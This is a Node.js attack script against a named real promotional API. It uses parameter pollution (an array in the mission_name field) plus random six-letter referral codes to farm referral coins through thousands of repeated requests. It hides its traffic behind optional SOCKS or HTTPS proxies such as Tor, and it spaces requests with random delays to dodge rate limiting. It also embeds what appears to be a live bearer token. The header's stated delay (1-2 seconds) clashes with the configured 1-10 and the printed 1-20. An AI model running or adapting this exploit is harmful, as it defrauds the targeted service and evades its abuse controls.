/**
 * Referral Spam - Parameter Pollution Bypass
 * Random 1-2 second delay between requests
 *
 * Usage: node referral-spam.js [token] [count] [proxyUrl]
 * Example: node referral-spam.js "token" 100 "socks5://127.0.0.1:9050"
 */

const fetch = require('node-fetch');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');

const CONFIG = {
  token: process.argv[2] || '545029|7AaGWjjzE815naLIwKMazTIggTFTohUTr2KAIvWWc51ed48c',
  count: parseInt(process.argv[3]) || 5257,
  proxyUrl: process.argv[4] || null,
  delayMin: 1,     // Minimum delay in seconds
  delayMax: 10,    // Maximum delay in seconds
};

// Create proxy agent if proxy URL provided
let agent = null;
if (CONFIG.proxyUrl) {
  if (CONFIG.proxyUrl.startsWith('socks')) {
    agent = new SocksProxyAgent(CONFIG.proxyUrl);
  } else {
    agent = new HttpsProxyAgent(CONFIG.proxyUrl);
  }
}

const BASE_URL = 'https://landing.emofid.com/api-service/anniversary40';

const HEADERS = {
  'Authorization': `Bearer ${CONFIG.token}`,
  'Content-Type': 'application/json',
  'Cookie': `anniversary40_token=${CONFIG.token}`,
};

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function randomDelay() {
  const range = (CONFIG.delayMax - CONFIG.delayMin) * 1000;
  return Math.floor(Math.random() * range) + (CONFIG.delayMin * 1000);
}

async function getCoins(retries = 3) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const res = await fetch(`${BASE_URL}/user/`, { headers: HEADERS, agent });
      const data = await res.json();
      return parseFloat(data.data.scores[0].coins);
    } catch (err) {
      if (attempt === retries) {
        console.log(`   ⚠️  Failed to get coins: ${err.message}`);
        return null;
      }
      await sleep(2000 * attempt);
    }
  }
}

function generateCode() {
  // Real format: 6 uppercase letters (A-Z)
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

async function exploit(retries = 10) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const response = await fetch(`${BASE_URL}/actions/`, {
        method: 'POST',
        headers: HEADERS,
        body: JSON.stringify({
          mission_name: ['referral', 'landing-login'],
          referral_code: generateCode(),
        }),
        agent,
      });
      return await response.json();
    } catch (err) {
      if (attempt === retries) {
        return { message: `Network error after ${retries} retries: ${err.message}`, error: true };
      }
      console.log(`   ⚠️  Network error, retrying (${attempt}/${retries})...`);
      await sleep(2000 * attempt); // Exponential backoff
    }
  }
}

async function checkProxyIP() {
  if (!agent) return 'No proxy';
  try {
    const res = await fetch('https://httpbin.org/ip', { agent, timeout: 10000 });
    const data = await res.json();
    return data.origin;
  } catch (err) {
    return 'Error: ' + err.message;
  }
}

async function main() {
  console.log('='.repeat(45));
  console.log('  Referral Spam (1-20s random delay)');
  console.log('='.repeat(45));
  console.log(`Token: ${CONFIG.token.substring(0, 15)}...`);
  console.log(`Count: ${CONFIG.count}`);
  if (CONFIG.proxyUrl) {
    console.log(`Proxy: ${CONFIG.proxyUrl}`);
    const ip = await checkProxyIP();
    console.log(`Proxy IP: ${ip}`);
  }

  const initialCoins = await getCoins();
  console.log(`\nStarting coins: ${initialCoins ?? 'unknown'}`);
  console.log(`Target: +${CONFIG.count * 10} coins\n`);

  let success = 0;

  for (let i = 1; i <= CONFIG.count; i++) {
    const result = await exploit();

    if (result.message?.toLowerCase().includes('success')) {
      success++;
      console.log(`[${i}/${CONFIG.count}] +10 ✓ (total: +${success * 10})`);
    } else {
      console.log(`[${i}/${CONFIG.count}] ${result.message}`);
    }

    if (i < CONFIG.count) {
      const delay = randomDelay();
      await sleep(delay);
    }
  }

  const finalCoins = await getCoins();

  console.log('\n' + '='.repeat(45));
  console.log(`Final coins: ${finalCoins ?? 'unknown'}`);
  if (finalCoins && initialCoins) {
    console.log(`Gained: +${finalCoins - initialCoins}`);
  } else {
    console.log(`Successful requests: ${success} (+${success * 10} estimated)`);
  }
  console.log('='.repeat(45));
}

main().catch(console.error);
